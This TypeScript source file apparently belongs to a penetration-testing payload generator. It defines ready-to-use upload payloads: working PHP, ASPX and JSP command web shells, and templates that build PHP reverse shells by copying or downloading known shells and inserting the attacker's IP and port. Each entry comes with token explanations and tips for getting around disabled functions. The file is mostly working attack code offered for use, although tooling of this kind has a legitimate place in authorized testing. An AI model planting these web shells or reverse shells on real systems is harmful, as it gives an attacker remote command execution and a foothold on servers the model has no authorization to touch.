import type { ListenerId, PayloadDef } from "./types";

const REVERSE: ListenerId[] = ["penelope", "rlwrap-nc"];
const TRIGGER = "http://{TARGET_IP}/{UPLOAD_PATH}/{FILE}?cmd=whoami";
const JSP = (sh: string, flag: string) =>
  `<% String c = request.getParameter("cmd"); if (c != null) { Process p = Runtime.getRuntime().exec(new String[]{"${sh}","${flag}",c}); java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while ((l = r.readLine()) != null) out.println(l); } %>`;
const JSP_PARTS = (sh: string, flag: string) => [
  { token: `"${sh}","${flag}"`, explain: "The shell and its run-this-string flag; the cmd parameter is appended as the command." },
  { token: "request.getParameter(\"cmd\")", explain: "Reads the command from ?cmd= in the request." },
  { token: "out.println(l)", explain: "Writes each line of the command's output into the response." },
];

export const UPLOAD_SHELLS: PayloadDef[] = [
  {
    id: "upload-php-cmd", generator: "shell", title: "PHP web shell (?cmd=)", os: "any",
    contexts: ["uploaded-file"], requires: ["php"], listeners: [], shape: "webshell",
    template: "<?php system($_REQUEST['cmd']); ?>", defaults: { FILE: "shell.php" },
    upload: { trigger: TRIGGER },
    parts: [
      { token: "system(", explain: "Runs the command on the OS and prints its output." },
      { token: "$_REQUEST['cmd']", explain: "Takes the command from ?cmd= (GET) or the POST body." },
    ],
    notes: ["If the page comes back blank, system() may be disabled: try echo shell_exec($_REQUEST['cmd']); or passthru($_REQUEST['cmd']);.",
      "Used as a file written into a web-served directory (upload, LFI, INTO OUTFILE)."],
  },
  {
    id: "upload-aspx-cmd", generator: "shell", title: "ASPX web shell (IIS)", os: "windows",
    contexts: ["uploaded-file"], requires: [], listeners: [], shape: "webshell",
    template: `<%@ Page Language="C#" %><% var p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request["cmd"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>`,
    defaults: { FILE: "shell.aspx" }, upload: { trigger: TRIGGER },
    parts: [
      { token: "cmd.exe", explain: "Runs the command through cmd.exe." },
      { token: "\"/c \"", explain: "/c: run the string and exit." },
      { token: "Request[\"cmd\"]", explain: "Takes the command from ?cmd=." },
      { token: "ReadToEnd()", explain: "Reads all the output and returns it in the response." },
    ],
    notes: ["Used as an uploaded .aspx file on IIS / ASP.NET. Kali also ships /usr/share/webshells/aspx/cmdasp.aspx."],
  },
  {
    id: "upload-jsp-cmd-linux", generator: "shell", title: "JSP web shell (Linux)", os: "linux",
    contexts: ["uploaded-file"], requires: [], listeners: [], shape: "webshell",
    template: JSP("/bin/sh", "-c"), defaults: { FILE: "shell.jsp" }, upload: { trigger: TRIGGER },
    parts: JSP_PARTS("/bin/sh", "-c"),
    notes: ["Used as an uploaded .jsp on Tomcat or another Java server. Kali copy: /usr/share/webshells/jsp/cmdjsp.jsp."],
  },
  {
    id: "upload-jsp-cmd-windows", generator: "shell", title: "JSP web shell (Windows)", os: "windows",
    contexts: ["uploaded-file"], requires: [], listeners: [], shape: "webshell",
    template: JSP("cmd.exe", "/c"), defaults: { FILE: "shell.jsp" }, upload: { trigger: TRIGGER },
    parts: JSP_PARTS("cmd.exe", "/c"),
    notes: ["Used as an uploaded .jsp on Tomcat or another Java server on Windows."],
  },
  {
    id: "upload-php-pentestmonkey", generator: "shell", title: "PHP reverse shell (pentestmonkey)", os: "linux",
    contexts: ["uploaded-file"], requires: ["php"], listeners: REVERSE, bakesIp: true,
    template: `cp /usr/share/webshells/php/php-reverse-shell.php {FILE} && sed -i "s/^\\$ip = .*/\\$ip = '{LHOST}';/; s/^\\$port = .*/\\$port = {LPORT};/" {FILE}`,
    defaults: { FILE: "rev.php" }, upload: { trigger: "http://{TARGET_IP}/{UPLOAD_PATH}/{FILE}", kali: true },
    parts: [
      { token: "cp /usr/share/webshells/php/php-reverse-shell.php", explain: "Copies Kali's stock PHP reverse shell so the original stays clean." },
      { token: "sed -i", explain: "-i: edit the copy in place." },
      { token: "^\\$ip = .*", explain: "Matches the $ip line (it starts at column 0 in the stock file) and sets it to your LHOST." },
      { token: "^\\$port = .*", explain: "Matches the $port line and sets it to your LPORT." },
    ],
    notes: ["Run on Kali, then upload the file and open it. It uses /bin/sh, so it does not work on Windows PHP."],
  },
  {
    id: "upload-php-ivan-sincek", generator: "shell", title: "PHP reverse shell (Ivan Sincek)", os: "any",
    contexts: ["uploaded-file"], requires: ["php"], listeners: REVERSE, bakesIp: true,
    template: `curl -so {FILE} https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php && sed -i "s/new Shell([^)]*)/new Shell('{LHOST}', {LPORT})/" {FILE}`,
    defaults: { FILE: "rev.php" }, upload: { trigger: "http://{TARGET_IP}/{UPLOAD_PATH}/{FILE}", kali: true },
    parts: [
      { token: "curl -so", explain: "-s: silent. -o: write the download to {FILE}." },
      { token: "sed -i", explain: "-i: edit the downloaded file in place." },
      { token: "new Shell(", explain: "The file's default call (127.0.0.1, 9000) is replaced with your LHOST and LPORT." },
    ],
    notes: ["Needs internet on Kali; keep a copy in your tools folder for offline labs. Works on Windows and Linux PHP."],
  },
];
